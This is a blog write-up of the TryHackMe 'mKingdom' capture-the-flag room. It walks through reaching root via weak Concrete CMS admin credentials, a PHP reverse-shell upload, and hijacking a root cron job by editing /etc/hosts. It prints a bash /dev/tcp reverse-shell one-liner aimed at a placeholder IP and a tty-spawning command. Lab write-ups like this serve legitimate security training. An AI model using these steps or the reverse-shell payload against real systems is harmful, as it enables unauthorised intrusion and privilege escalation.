---
title: THM mKingdom
author: hanhctf
date: 2024-06-20 12:00:00 +0700
categories: [Write-up, THM]
tags: []
toc: true
mermaid: true
---

# [**mKingdom**](https://tryhackme.com/r/room/mkingdom)

# Summary

> - Weak credentials in the admin portal.
> - Hidden Creds in the backup file and environment.  

## NMAP

```text
PORT   STATE SERVICE REASON  VERSION
85/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0H N0! PWN3D 4G4IN
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
```

## Web Enumeration

On the homepage, nothing interesting.  
FUZZ directory with `ffuf`, we found `/app`.  
![](/commons/THM/mKingdom/0_app.png)  

Looking on `/app`.  
The app is using `Concrete CMS 8.5.2`.  
A quick search about `Concrete CMS 8.5.2`.  
![](/commons/THM/mKingdom/1_CMS.png)

After reading `Document`, we found the login page URL.  
![](/commons/THM/mKingdom/2_login.png)  

`Weak credential`. Log in to `dashboard` with weak credentials.  

After checking some functions in the admin dashboard.
We can upload files to the system. `File upload` vuln is the first thing on my mind.  
After checking some techniques to bypass the system, cannot bypass it.  
Continuous check other settings, we can add file `extensions`.  
Add `.php` and upload a `php reverse shell`.  
![](/commons/THM/mKingdom/3_extensions.png)  

![](/commons/THM/mKingdom/4_rev.png)  

![](/commons/THM/mKingdom/5_shell.png)  

Spawn a tty shell with Python.  

```text
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

[linpeas.sh](https://github.com/peass-ng/PEASS-ng). I've mentioned it many times, it's one of my favorite tools for finding ways to escalate privileges.  
Found interesting `password`  
![](/commons/THM/mKingdom/6_toad.png)  

Change the user and run `linpeas.sh` again.  

![](/commons/THM/mKingdom/7_mario.png)  

***GOT USER.TXT FLAG***

## Privilege Escalation

Continuing run `linpeas.sh`. we discovered a bunch of interesting things but none of them were usable.  
![](/commons/THM/mKingdom/8_hosts.png)  

After deep enumeration, check cronjob with [pspy](https://github.com/DominicBreuker/pspy)  

![](/commons/THM/mKingdom/9_curl.png)  

Lookback, we can edit `/etc/hosts`.  
Create a `/app/castle/application/counter.sh` in localhost.

```shell
#!/bin/bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

And run the HTTP server on port 85.
Change `/etc/hosts` with `localIP mkingdom.thm` and  
![](/commons/THM/mKingdom//10_root.png)

***GOT ROOT.TXT FLAG***
